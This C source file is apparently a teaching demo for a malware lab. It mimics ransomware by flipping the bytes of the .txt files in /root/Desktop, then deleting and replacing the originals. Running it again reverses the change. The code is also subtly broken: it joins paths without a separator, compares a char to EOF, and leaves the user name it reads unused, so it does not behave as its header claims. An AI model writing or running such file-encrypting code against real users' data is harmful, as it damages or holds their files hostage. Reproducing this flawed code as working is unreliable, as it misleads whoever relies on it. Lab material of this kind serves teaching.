/**
 *
 * @brief      This program is written by Weiyang Zhang, for the malware lab experiment. The purpose of this program 
 *             is to make students have a sense of what a ransomware is. Students will be guided to run the program, and
 *             all of files on destop will be encrypted using an invertable algorithm, that is, all files on desktop will 
 *             be encrypted by running the program this first time,and all files will be decrypted when executing it by the
 *             second time.
 *
 * @author     Weiyang Zhang
 * @date       7/12/2020
 */

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <dirent.h>

#define MAX_LEN 256
/**
 * This method is used to get file extention.
 * @param  filename [description]
 * @return          [description]
 */
const char *get_filename_ext(const char *filename)
{
  const char *dot = strrchr(filename, '.');
  if(!dot || dot == filename) 
    return "";
  return dot + 1;
}


int main(int argc, char const *argv[])
{

  //Get current user name
  char *curr_user;
  curr_user = getenv("USER");

  //Format the desired directory that we want to encrypt
  char dest_encrypt_dir[MAX_LEN] = "/root/Desktop";

  struct dirent *de; // Pointer for directory entry
  DIR *dr = opendir(dest_encrypt_dir);
  if (dr == NULL)
  {
    perror("Could not open the directory");
    return -1;
  }

  char full_file_path[MAX_LEN];


  while ((de = readdir(dr)) != NULL) {
    char src[MAX_LEN], tgt[MAX_LEN], ch;
    memset(full_file_path, 0, MAX_LEN);
    
    strcat(full_file_path, dest_encrypt_dir);
    strcat(full_file_path, de->d_name);
   
    //for test purpose we only encrypt txt files.
    const char *ext = get_filename_ext(full_file_path);
    if( strcmp(ext, "txt")!=0) {
      continue;
    }

    FILE *fs;
    fs = fopen(full_file_path, "r");

    if(fs == NULL) {
      perror("Error while opening file");
      continue;
    }

    sprintf(tgt , "%s.ed", full_file_path); //format the name of the temporary file 
    FILE *ft;
    ft = fopen(tgt, "w");
    if(ft == NULL) {
      continue;
    }

    while( (ch = fgetc(fs)) != EOF) { 
      fputc(~ch, ft); // Encrypt or decrypt
    }

    fclose(fs);
    fclose(ft);
    remove(full_file_path);
    rename(tgt, full_file_path);
  }

  closedir(dr);

  return 0;
}
